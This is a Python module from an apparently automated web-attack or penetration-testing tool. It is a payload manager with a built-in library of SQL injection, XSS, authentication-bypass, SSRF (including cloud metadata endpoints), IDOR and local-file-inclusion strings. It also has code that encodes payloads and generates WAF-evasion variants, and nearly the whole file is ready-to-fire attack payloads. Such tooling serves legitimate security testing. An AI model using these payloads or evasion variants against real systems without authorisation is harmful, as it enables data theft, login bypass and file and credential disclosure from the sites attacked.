"""
XLayer AI Payload Manager - Payload database and context-aware selection
"""

import re
from typing import List, Dict, Optional, Any
from dataclasses import dataclass
from enum import Enum
from loguru import logger


class PayloadCategory(str, Enum):
    """Categories of payloads"""
    SQLI_ERROR = "sqli_error"
    SQLI_UNION = "sqli_union"
    SQLI_BOOLEAN = "sqli_boolean"
    SQLI_TIME = "sqli_time"
    XSS_REFLECTED = "xss_reflected"
    XSS_STORED = "xss_stored"
    XSS_DOM = "xss_dom"
    AUTH_BYPASS = "auth_bypass"
    IDOR = "idor"
    SSRF = "ssrf"
    LFI = "lfi"
    RFI = "rfi"
    PATH_TRAVERSAL = "path_traversal"


class DatabaseType(str, Enum):
    """Database types for SQLi payloads"""
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"
    GENERIC = "generic"


class XSSContext(str, Enum):
    """XSS injection contexts"""
    HTML_BODY = "html_body"
    HTML_ATTRIBUTE = "html_attribute"
    JAVASCRIPT = "javascript"
    URL = "url"
    CSS = "css"


@dataclass
class Payload:
    """A single payload with metadata"""
    value: str
    category: PayloadCategory
    description: str
    tags: List[str]
    encoding: Optional[str] = None
    bypass_waf: bool = False


class PayloadManager:
    """
    Manages exploit payloads with context-aware selection
    
    Features:
    - Built-in payload database
    - Context-aware payload selection
    - WAF bypass variants
    - Encoding support
    """
    
    def __init__(self):
        self._payloads: Dict[PayloadCategory, List[Payload]] = {}
        self._load_builtin_payloads()
    
    def _load_builtin_payloads(self):
        """Load built-in payload database"""
        
        self._payloads[PayloadCategory.SQLI_ERROR] = [
            Payload("'", PayloadCategory.SQLI_ERROR, "Single quote", ["basic", "error"]),
            Payload('"', PayloadCategory.SQLI_ERROR, "Double quote", ["basic", "error"]),
            Payload("'--", PayloadCategory.SQLI_ERROR, "Quote with comment", ["basic", "error"]),
            Payload("' OR '1'='1", PayloadCategory.SQLI_ERROR, "OR true condition", ["basic", "error"]),
            Payload("1' AND '1'='1", PayloadCategory.SQLI_ERROR, "AND true condition", ["basic", "error"]),
            Payload("1' AND '1'='2", PayloadCategory.SQLI_ERROR, "AND false condition", ["basic", "error"]),
            Payload("\\", PayloadCategory.SQLI_ERROR, "Backslash escape", ["basic", "error"]),
            Payload("' OR ''='", PayloadCategory.SQLI_ERROR, "Empty string OR", ["basic", "error"]),
        ]
        
        self._payloads[PayloadCategory.SQLI_UNION] = [
            Payload("' UNION SELECT NULL--", PayloadCategory.SQLI_UNION, "Union 1 column", ["union"]),
            Payload("' UNION SELECT NULL,NULL--", PayloadCategory.SQLI_UNION, "Union 2 columns", ["union"]),
            Payload("' UNION SELECT NULL,NULL,NULL--", PayloadCategory.SQLI_UNION, "Union 3 columns", ["union"]),
            Payload("' UNION SELECT NULL,NULL,NULL,NULL--", PayloadCategory.SQLI_UNION, "Union 4 columns", ["union"]),
            Payload("' UNION SELECT NULL,NULL,NULL,NULL,NULL--", PayloadCategory.SQLI_UNION, "Union 5 columns", ["union"]),
            Payload("' UNION SELECT version(),user(),database()--", PayloadCategory.SQLI_UNION, "MySQL info extraction", ["union", "mysql"]),
            Payload("' UNION SELECT @@version,user(),database()--", PayloadCategory.SQLI_UNION, "MySQL version", ["union", "mysql"]),
            Payload("' UNION SELECT version(),current_user,current_database()--", PayloadCategory.SQLI_UNION, "PostgreSQL info", ["union", "postgresql"]),
        ]
        
        self._payloads[PayloadCategory.SQLI_BOOLEAN] = [
            Payload("' AND 1=1--", PayloadCategory.SQLI_BOOLEAN, "Boolean true", ["boolean"]),
            Payload("' AND 1=2--", PayloadCategory.SQLI_BOOLEAN, "Boolean false", ["boolean"]),
            Payload("' AND 'a'='a", PayloadCategory.SQLI_BOOLEAN, "String comparison true", ["boolean"]),
            Payload("' AND 'a'='b", PayloadCategory.SQLI_BOOLEAN, "String comparison false", ["boolean"]),
            Payload("' AND (SELECT 1)=1--", PayloadCategory.SQLI_BOOLEAN, "Subquery true", ["boolean"]),
            Payload("' AND (SELECT 1)=2--", PayloadCategory.SQLI_BOOLEAN, "Subquery false", ["boolean"]),
        ]
        
        self._payloads[PayloadCategory.SQLI_TIME] = [
            Payload("' AND SLEEP(5)--", PayloadCategory.SQLI_TIME, "MySQL sleep 5s", ["time", "mysql"]),
            Payload("' AND SLEEP(10)--", PayloadCategory.SQLI_TIME, "MySQL sleep 10s", ["time", "mysql"]),
            Payload("'; WAITFOR DELAY '0:0:5'--", PayloadCategory.SQLI_TIME, "MSSQL delay 5s", ["time", "mssql"]),
            Payload("' AND pg_sleep(5)--", PayloadCategory.SQLI_TIME, "PostgreSQL sleep 5s", ["time", "postgresql"]),
            Payload("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", PayloadCategory.SQLI_TIME, "MySQL nested sleep", ["time", "mysql"]),
            Payload("1' AND BENCHMARK(10000000,MD5(1))--", PayloadCategory.SQLI_TIME, "MySQL benchmark", ["time", "mysql"]),
        ]
        
        self._payloads[PayloadCategory.XSS_REFLECTED] = [
            Payload("<script>alert('XSS')</script>", PayloadCategory.XSS_REFLECTED, "Basic script tag", ["basic", "html"]),
            Payload("<script>alert(document.domain)</script>", PayloadCategory.XSS_REFLECTED, "Domain alert", ["basic", "html"]),
            Payload("<img src=x onerror=alert('XSS')>", PayloadCategory.XSS_REFLECTED, "Img onerror", ["basic", "html"]),
            Payload("<svg onload=alert('XSS')>", PayloadCategory.XSS_REFLECTED, "SVG onload", ["basic", "html"]),
            Payload("<body onload=alert('XSS')>", PayloadCategory.XSS_REFLECTED, "Body onload", ["basic", "html"]),
            Payload("<iframe src=\"javascript:alert('XSS')\">", PayloadCategory.XSS_REFLECTED, "Iframe javascript", ["basic", "html"]),
            Payload("<input onfocus=alert('XSS') autofocus>", PayloadCategory.XSS_REFLECTED, "Input autofocus", ["basic", "html"]),
            Payload("<marquee onstart=alert('XSS')>", PayloadCategory.XSS_REFLECTED, "Marquee onstart", ["basic", "html"]),
            Payload("<details open ontoggle=alert('XSS')>", PayloadCategory.XSS_REFLECTED, "Details ontoggle", ["basic", "html"]),
            Payload("javascript:alert('XSS')", PayloadCategory.XSS_REFLECTED, "Javascript protocol", ["basic", "url"]),
            Payload("'-alert('XSS')-'", PayloadCategory.XSS_REFLECTED, "JS context break", ["basic", "javascript"]),
            Payload("';alert('XSS');//", PayloadCategory.XSS_REFLECTED, "JS string break", ["basic", "javascript"]),
            Payload("\" onmouseover=\"alert('XSS')\"", PayloadCategory.XSS_REFLECTED, "Attribute injection", ["basic", "attribute"]),
            Payload("' onfocus='alert(1)' autofocus='", PayloadCategory.XSS_REFLECTED, "Single quote attr", ["basic", "attribute"]),
        ]
        
        self._payloads[PayloadCategory.XSS_DOM] = [
            Payload("#<script>alert('XSS')</script>", PayloadCategory.XSS_DOM, "Hash-based DOM XSS", ["dom"]),
            Payload("javascript:alert(document.cookie)", PayloadCategory.XSS_DOM, "Cookie theft", ["dom"]),
            Payload("<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>", PayloadCategory.XSS_DOM, "Base64 encoded", ["dom", "bypass"]),
        ]
        
        self._payloads[PayloadCategory.AUTH_BYPASS] = [
            Payload("admin'--", PayloadCategory.AUTH_BYPASS, "SQL comment bypass", ["sqli"]),
            Payload("' OR 1=1--", PayloadCategory.AUTH_BYPASS, "OR true bypass", ["sqli"]),
            Payload("admin' OR '1'='1", PayloadCategory.AUTH_BYPASS, "Admin OR bypass", ["sqli"]),
            Payload("' OR ''='", PayloadCategory.AUTH_BYPASS, "Empty string bypass", ["sqli"]),
            Payload('{"$ne": null}', PayloadCategory.AUTH_BYPASS, "NoSQL not equal", ["nosql"]),
            Payload('{"$gt": ""}', PayloadCategory.AUTH_BYPASS, "NoSQL greater than", ["nosql"]),
            Payload("admin'/*", PayloadCategory.AUTH_BYPASS, "Block comment bypass", ["sqli"]),
        ]
        
        self._payloads[PayloadCategory.IDOR] = [
            Payload("1", PayloadCategory.IDOR, "ID 1", ["numeric"]),
            Payload("0", PayloadCategory.IDOR, "ID 0", ["numeric"]),
            Payload("-1", PayloadCategory.IDOR, "Negative ID", ["numeric"]),
            Payload("999999", PayloadCategory.IDOR, "Large ID", ["numeric"]),
            Payload("../user/1", PayloadCategory.IDOR, "Path traversal ID", ["path"]),
        ]
        
        self._payloads[PayloadCategory.SSRF] = [
            Payload("http://127.0.0.1", PayloadCategory.SSRF, "Localhost", ["internal"]),
            Payload("http://localhost", PayloadCategory.SSRF, "Localhost name", ["internal"]),
            Payload("http://169.254.169.254", PayloadCategory.SSRF, "AWS metadata", ["cloud"]),
            Payload("http://169.254.169.254/latest/meta-data/", PayloadCategory.SSRF, "AWS metadata path", ["cloud"]),
            Payload("http://metadata.google.internal", PayloadCategory.SSRF, "GCP metadata", ["cloud"]),
            Payload("http://[::1]", PayloadCategory.SSRF, "IPv6 localhost", ["internal", "bypass"]),
            Payload("http://0.0.0.0", PayloadCategory.SSRF, "Zero IP", ["internal"]),
            Payload("http://0177.0.0.1", PayloadCategory.SSRF, "Octal localhost", ["internal", "bypass"]),
            Payload("http://2130706433", PayloadCategory.SSRF, "Decimal localhost", ["internal", "bypass"]),
        ]
        
        self._payloads[PayloadCategory.LFI] = [
            Payload("../../../etc/passwd", PayloadCategory.LFI, "Linux passwd", ["linux"]),
            Payload("....//....//....//etc/passwd", PayloadCategory.LFI, "Double dot bypass", ["linux", "bypass"]),
            Payload("..%2F..%2F..%2Fetc%2Fpasswd", PayloadCategory.LFI, "URL encoded", ["linux", "bypass"]),
            Payload("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", PayloadCategory.LFI, "Windows hosts", ["windows"]),
            Payload("/etc/passwd%00", PayloadCategory.LFI, "Null byte bypass", ["linux", "bypass"]),
            Payload("php://filter/convert.base64-encode/resource=index.php", PayloadCategory.LFI, "PHP filter", ["php"]),
            Payload("file:///etc/passwd", PayloadCategory.LFI, "File protocol", ["linux"]),
        ]
        
        self._payloads[PayloadCategory.PATH_TRAVERSAL] = [
            Payload("../", PayloadCategory.PATH_TRAVERSAL, "Single traversal", ["basic"]),
            Payload("..\\", PayloadCategory.PATH_TRAVERSAL, "Windows traversal", ["windows"]),
            Payload("....//", PayloadCategory.PATH_TRAVERSAL, "Double dot bypass", ["bypass"]),
            Payload("..%252f", PayloadCategory.PATH_TRAVERSAL, "Double URL encode", ["bypass"]),
            Payload("%2e%2e%2f", PayloadCategory.PATH_TRAVERSAL, "URL encoded dots", ["bypass"]),
            Payload("..%c0%af", PayloadCategory.PATH_TRAVERSAL, "UTF-8 overlong", ["bypass"]),
        ]
        
        logger.debug(f"Loaded {sum(len(p) for p in self._payloads.values())} payloads")
    
    def get_payloads(
        self,
        category: PayloadCategory,
        tags: Optional[List[str]] = None,
        limit: Optional[int] = None
    ) -> List[Payload]:
        """
        Get payloads by category and optional tags
        
        Args:
            category: Payload category
            tags: Optional tags to filter by
            limit: Maximum number of payloads to return
            
        Returns:
            List of matching payloads
        """
        payloads = self._payloads.get(category, [])
        
        if tags:
            payloads = [p for p in payloads if any(t in p.tags for t in tags)]
        
        if limit:
            payloads = payloads[:limit]
        
        return payloads
    
    def get_sqli_payloads(
        self,
        db_type: DatabaseType = DatabaseType.GENERIC,
        include_time_based: bool = True
    ) -> List[Payload]:
        """Get SQL injection payloads for specific database"""
        payloads = []
        
        payloads.extend(self.get_payloads(PayloadCategory.SQLI_ERROR))
        payloads.extend(self.get_payloads(PayloadCategory.SQLI_BOOLEAN))
        
        if db_type != DatabaseType.GENERIC:
            union_payloads = self.get_payloads(PayloadCategory.SQLI_UNION, tags=[db_type.value])
            if not union_payloads:
                union_payloads = self.get_payloads(PayloadCategory.SQLI_UNION)
            payloads.extend(union_payloads)
        else:
            payloads.extend(self.get_payloads(PayloadCategory.SQLI_UNION))
        
        if include_time_based:
            if db_type != DatabaseType.GENERIC:
                time_payloads = self.get_payloads(PayloadCategory.SQLI_TIME, tags=[db_type.value])
                if not time_payloads:
                    time_payloads = self.get_payloads(PayloadCategory.SQLI_TIME)
                payloads.extend(time_payloads)
            else:
                payloads.extend(self.get_payloads(PayloadCategory.SQLI_TIME))
        
        return payloads
    
    def get_xss_payloads(
        self,
        context: XSSContext = XSSContext.HTML_BODY
    ) -> List[Payload]:
        """Get XSS payloads for specific context"""
        payloads = []
        
        context_tags = {
            XSSContext.HTML_BODY: ["html"],
            XSSContext.HTML_ATTRIBUTE: ["attribute"],
            XSSContext.JAVASCRIPT: ["javascript"],
            XSSContext.URL: ["url"],
            XSSContext.CSS: ["css"]
        }
        
        tags = context_tags.get(context, ["html"])
        
        payloads.extend(self.get_payloads(PayloadCategory.XSS_REFLECTED, tags=tags))
        
        if not payloads:
            payloads.extend(self.get_payloads(PayloadCategory.XSS_REFLECTED, tags=["basic"]))
        
        payloads.extend(self.get_payloads(PayloadCategory.XSS_DOM))
        
        return payloads
    
    def get_auth_bypass_payloads(self) -> List[Payload]:
        """Get authentication bypass payloads"""
        return self.get_payloads(PayloadCategory.AUTH_BYPASS)
    
    def get_ssrf_payloads(self, include_cloud: bool = True) -> List[Payload]:
        """Get SSRF payloads"""
        payloads = self.get_payloads(PayloadCategory.SSRF, tags=["internal"])
        
        if include_cloud:
            payloads.extend(self.get_payloads(PayloadCategory.SSRF, tags=["cloud"]))
        
        return payloads
    
    def get_lfi_payloads(self, os_type: str = "linux") -> List[Payload]:
        """Get LFI payloads for specific OS"""
        payloads = self.get_payloads(PayloadCategory.LFI, tags=[os_type])
        payloads.extend(self.get_payloads(PayloadCategory.LFI, tags=["bypass"]))
        payloads.extend(self.get_payloads(PayloadCategory.PATH_TRAVERSAL))
        return payloads
    
    def encode_payload(self, payload: str, encoding: str) -> str:
        """Encode payload with specified encoding"""
        import urllib.parse
        import base64 as b64
        
        if encoding == "url":
            return urllib.parse.quote(payload)
        elif encoding == "double_url":
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding == "base64":
            return b64.b64encode(payload.encode()).decode()
        elif encoding == "html":
            return "".join(f"&#{ord(c)};" for c in payload)
        elif encoding == "unicode":
            return "".join(f"\\u{ord(c):04x}" for c in payload)
        else:
            return payload
    
    def get_waf_bypass_variants(self, payload: str) -> List[str]:
        """Generate WAF bypass variants of a payload"""
        variants = [payload]
        
        variants.append(payload.replace(" ", "/**/"))
        variants.append(payload.replace(" ", "%09"))
        variants.append(payload.replace(" ", "%0a"))
        
        variants.append(payload.upper())
        variants.append(payload.lower())
        variants.append("".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload)))
        
        variants.append(self.encode_payload(payload, "url"))
        variants.append(self.encode_payload(payload, "double_url"))
        
        return list(set(variants))
